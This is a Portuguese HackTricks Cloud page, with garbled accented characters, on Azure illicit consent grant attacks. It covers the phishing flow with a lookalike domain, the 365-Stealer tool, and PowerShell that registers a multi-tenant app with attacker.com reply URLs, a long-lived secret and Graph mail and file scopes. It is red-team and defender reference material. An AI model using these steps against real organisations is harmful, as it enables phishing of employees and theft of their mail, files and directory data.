# Az - Concess√£o de Consentimento Il√≠cito

<details>

<summary><strong>Apoie o HackTricks e obtenha benef√≠cios!</strong></summary>

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou se deseja acessar a **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) no github.

</details>

## Phishing de Aplicativo OAuth

**Os aplicativos Azure** solicitam permiss√µes para acessar os **dados do usu√°rio** (informa√ß√µes b√°sicas, mas tamb√©m acesso a documentos, envio de e-mails...).\
Se **permitido**, um usu√°rio normal pode conceder consentimento apenas para **"Permiss√µes de Baixo Impacto"**. Em **todos os outros** casos, **√© necess√°rio o consentimento do administrador**.\
`GA`, `ApplicationAdministrator`, `CloudApplication` `Administrator` e uma fun√ß√£o personalizada que inclui `permiss√£o para conceder permiss√µes a aplicativos` podem fornecer consentimento em todo o locat√°rio.

Somente as permiss√µes que **n√£o requerem consentimento do administrador** s√£o classificadas como **baixo impacto**. Essas s√£o as permiss√µes necess√°rias para **login b√°sico s√£o openid, perfil, email, User.Read e offline\_access**. Se uma **organiza√ß√£o** **permite** o consentimento do usu√°rio para **todos os aplicativos**, um funcion√°rio pode conceder consentimento a um aplicativo para **ler o acima de seu perfil**.

<figure><img src="../../../.gitbook/assets/image (3) (2) (1).png" alt=""><figcaption></figcaption></figure>

Portanto, um atacante poderia preparar um **aplicativo malicioso** e, com um **phishing**, fazer o usu√°rio **aceitar o aplicativo e roubar seus dados**.

### Verificar se os usu√°rios est√£o autorizados a consentir

Verifique se os usu√°rios est√£o autorizados a consentir em aplicativos:

{% code overflow="wrap" %}
```powershell
PS AzureADPreview> (GetAzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
```
{% endcode %}

* **Desativar consentimento do usu√°rio**: Os usu√°rios n√£o podem conceder permiss√µes a aplicativos.
* **Os usu√°rios podem consentir em aplicativos de editores verificados ou de sua organiza√ß√£o, mas apenas para as permiss√µes que voc√™ selecionar**: Todos os usu√°rios s√≥ podem consentir em aplicativos publicados por um editor verificado e aplicativos registrados em seu locat√°rio.
* **Os usu√°rios podem consentir em todos os aplicativos**: permite que todos os usu√°rios concedam consentimento a qualquer permiss√£o que n√£o exija consentimento do administrador,
* **Pol√≠tica de consentimento de aplicativo personalizada**

## **O que √© Ataque de Concess√£o de Consentimento Il√≠cito?**

Em um ataque de concess√£o de consentimento il√≠cito, o atacante cria um **aplicativo registrado no Azure que solicita acesso a dados, como informa√ß√µes de contato, e-mails ou documentos**. O atacante ent√£o engana um usu√°rio final para conceder consentimento ao aplicativo para que o atacante possa acessar os dados aos quais o usu√°rio-alvo tem acesso. Depois que o aplicativo recebeu o consentimento, ele tem acesso ao n√≠vel da conta do usu√°rio aos dados sem a necessidade de uma conta organizacional.

Em palavras simples, quando a v√≠tima clica no belo bot√£o azul "Aceitar", o Azure AD envia um token para o site de terceiros que pertence a um atacante, onde o atacante usar√° o token para realizar a√ß√µes em nome das v√≠timas, como acessar todos os arquivos, ler e-mails, enviar e-mails, etc.

## **Fluxo do Ataque**

<figure><img src="../../../.gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>

Para realizar esse ataque contra a empresa "ecorp", o atacante pode registrar um dom√≠nio com o nome "safedomainlogin.com" e criar um subdom√≠nio ["ecorp.safedomainlogin.com"](http://ecorp.safedomainlogin.com/) onde eles **hospedaram o aplicativo para capturar o c√≥digo de autoriza√ß√£o** e, em seguida, solicitar os tokens de acesso.

Em seguida, registre um aplicativo de v√°rios locat√°rios em seu locat√°rio do Azure AD e nomeie-o como "ecorp" e adicione o URL de redirecionamento que aponta para o "ecorp.safedomainlogin.com", que hospeda um aplicativo para capturar o c√≥digo de autoriza√ß√£o.

O atacante tamb√©m cria um novo segredo do cliente e adiciona algumas **permiss√µes** de API, como `Mail.Read`, `Notes.Read.All`, `Files.ReadWrite.All`, `User.ReadBasic.All`, `User.Read` no aplicativo. Para que, uma vez que o **usu√°rio conceda o consentimento ao aplicativo**, o atacante possa **extrair** as **informa√ß√µes sens√≠veis** em nome do usu√°rio.

O atacante finalmente cria o **link** que continha o ID do cliente do aplicativo malicioso e **compartilha** o link com os **usu√°rios-alvo** para obter o consentimento deles.

## 365-Stealer

Voc√™ pode realizar esse ataque com [**365-Stealer**](https://github.com/AlteredSecurity/365-Stealer).

Como etapa extra, se voc√™ tiver algum **acesso a um usu√°rio na organiza√ß√£o da v√≠tima**, poder√° verificar se a pol√≠tica permitir√° que ele **aceite aplicativos**:
```powershell
Import-Module .\AzureADPreview\AzureADPreview.psd1
$passwd = ConvertTo-SecureString "Welcome2022!" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("test@corp.onmicrosoft.com", $passwd)
Connect-AzureAD -Credential $creds
(Get-AzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
# If "ManagePermissionGrantsForSelf.microsoft-user-default-legacy", he can
```
Para este ataque, voc√™ precisar√° criar um **novo aplicativo em seu Azure Tenant** (em registros de aplicativos) com, por exemplo, as seguintes permiss√µes:

<figure><img src="../../../.gitbook/assets/image (2) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

`User.ReadBasic.All` est√° dentro de `Microsoft Graph` em `Permiss√µes delegadas`. (As permiss√µes de aplicativo sempre precisar√£o de aprova√ß√£o extra).

* `User.ReadBasic.All` √© a permiss√£o que permitir√° que voc√™ **leia informa√ß√µes de todos os usu√°rios** na organiza√ß√£o se concedida.
* Lembre-se de que apenas `GA`, `ApplicationAdministrator`, `CloudApplication` `Administrator` e uma fun√ß√£o personalizada que inclua `permiss√£o para conceder permiss√µes a aplicativos` podem fornecer consentimento em n√≠vel de locat√°rio. Portanto, voc√™ deve **phish um usu√°rio com uma dessas fun√ß√µes** se quiser que ele aprove um **aplicativo que requer consentimento de administrador**.

Voc√™ tamb√©m pode criar um aplicativo via cli com:

{% code overflow="wrap" %}
```bash
# Generate Application
New-AzureADApplication -DisplayName "MyApp"  -ReplyUrls @("https://attacker.com", "https://attacker.com/gettoken") -Oauth2AllowImplicitFlow $true -AvailableToOtherTenants $true

# Generate Secret
New-AzureADApplicationPasswordCredential -ObjectId f76ebd35-xxxx-xxxx-xxxx-xxxxxxxxxxxx -CustomKeyIdentifier "MyAppSecret" -StartDate (Get-Date) -EndDate (Get-Date).AddYears(3)

# Generate an application with the permissions
$objectid=New-AzureADApplication -DisplayName "AppName"  -ReplyUrls @("https://example.com/login/authorized") -Oauth2AllowImplicitFlow $true -AvailableToOtherTenants $true | select-object ObjectId
New-AzureADApplicationPasswordCredential -ObjectId $objectid.ObjectId -CustomKeyIdentifier "secret" -StartDate (Get-Date) -EndDate (Get-Date).AddYears(3)

$AppObjectID = $objectid.ObjectId # object id in AD
$app = Get-AzureADApplication -ObjectId $AppObjectID
$AADAccess = $app.RequiredResourceAccess | Where-Object {$_.ResourceAppId -eq "00000003-0000-0000-c000-000000000000"}  # "00000003-0000-0000-c000-000000000000" represents Graph API
if($AADAccess -eq $null) {
  $AADAccess = New-Object Microsoft.Open.AzureAD.Model.RequiredResourceAccess
  $AADAccess.ResourceAppId = "00000003-0000-0000-c000-000000000000"

  $Access = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
  $Access.Type = "Scope"
  $Access.Id = "14dad69e-099b-42c9-810b-d002981feec1"
  $AADAccess.ResourceAccess = @()
  $AADAccess.ResourceAccess.Add($Access)

  $Access2 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
  $Access2.Type = "Scope"
  $Access2.Id = "e1fe6dd8-ba31-4d61-89e7-88639da4683d"
  $AADAccess.ResourceAccess.Add($Access2)

  $Access3 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
  $Access3.Type = "Scope"
  $Access3.Id = "df85f4d6-205c-4ac5-a5ea-6bf408dba283"
  $AADAccess.ResourceAccess.Add($Access3)

  $Access4 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
  $Access4.Type = "Scope"
  $Access4.Id = "10465720-29dd-4523-a11a-6a75c743c9d9"
  $AADAccess.ResourceAccess.Add($Access4)

  $app.RequiredResourceAccess.Add($AADAccess)
} else {
  $Access = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
  $Access.Type = "Scope"
  $Access.Id = "14dad69e-099b-42c9-810b-d002981feec1"
  $AADAccess.ResourceAccess = @()
  $AADAccess.ResourceAccess.Add($Access)

  $Access2 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
  $Access2.Type = "Scope"
  $Access2.Id = "e1fe6dd8-ba31-4d61-89e7-88639da4683d"
  $AADAccess.ResourceAccess.Add($Access2)

  $Access3 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
  $Access3.Type = "Scope"
  $Access3.Id = "df85f4d6-205c-4ac5-a5ea-6bf408dba283"
  $AADAccess.ResourceAccess.Add($Access3)

  $Access4 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
  $Access4.Type = "Scope"
  $Access4.Id = "10465720-29dd-4523-a11a-6a75c743c9d9"
  $AADAccess.ResourceAccess.Add($Access4)
}

Set-AzureADApplication -ObjectId $AppObjectID -RequiredResourceAccess $app.RequiredResourceAccess
Get-AzureADApplication -ObjectId $objectid.ObjectId | select-object appid
```
{% endcode %}

Confira [https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer) para aprender como configur√°-lo.

{% hint style="warning" %}
Observe que o **token de acesso** obtido ser√° para o **endpoint do graph** com os escopos: `User.Read` e `User.ReadBasic.All` (as permiss√µes solicitadas). Voc√™ n√£o poder√° realizar outras a√ß√µes (mas isso √© suficiente para **baixar informa√ß√µes sobre todos os usu√°rios** na organiza√ß√£o).
{% endhint %}

## [O365-Attack-Toolkit](https://github.com/mdsecactivebreach/o365-attack-toolkit)

Voc√™ tamb√©m pode usar essa ferramenta para realizar esse ataque.

## P√≥s-Explora√ß√£o

Depois de obter acesso ao usu√°rio, voc√™ pode fazer coisas como roubar documentos confidenciais e at√© mesmo fazer upload de arquivos de documentos com backdoor.

## Refer√™ncias

* Este post foi copiado de [https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer)

<details>

<summary><strong>Apoie o HackTricks e obtenha benef√≠cios!</strong></summary>

* Se voc√™ quiser ver sua **empresa anunciada no HackTricks** ou se quiser acessar a **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe seus truques de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) no github.

</details>
